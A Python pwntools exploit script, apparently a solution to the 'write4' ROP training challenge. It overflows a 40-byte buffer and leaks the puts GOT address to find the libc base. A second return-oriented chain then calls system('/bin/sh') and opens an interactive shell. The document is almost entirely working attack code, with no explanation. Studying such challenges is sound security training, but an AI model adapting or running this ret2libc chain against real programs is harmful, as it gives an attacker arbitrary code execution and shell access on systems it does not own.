from pwn import *
import base64

local_bin = "./write4"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process(local_bin)
elf = ELF(local_bin)
rop = ROP(elf)

puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
puts_GOT = elf.got["puts"]

rop1 = "A"*40 + p64(pop_rdi) + p64(puts_GOT) + p64(puts_plt) + p64(main_plt)
p.clean()
p.sendline(rop1)

leak = u64(p.recvline().strip().ljust(8, "\x00"))
libc.address = leak - libc.symbols["puts"]

bin_sh = next(libc.search("/bin/sh"))
system = libc.sym["system"]
exit = libc.sym["exit"]
rop2 = "A"*40 + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(exit)

log.info("Main address:            " + hex(main_plt))
log.info("Puts address (.plt):     " + hex(puts_plt))
log.info("Puts address (.got.plt): " + hex(puts_GOT))
log.info("pop rdi; ret  gadget:    " + hex(pop_rdi))
log.info("Leaked Puts address:     " + hex(leak))
log.info("Libc base address:       " + hex(libc.address))
log.info("String bin/sh address:   " + hex(bin_sh))
log.info("Function system address: " + hex(system))

p.clean()
p.sendline(rop2)
p.interactive()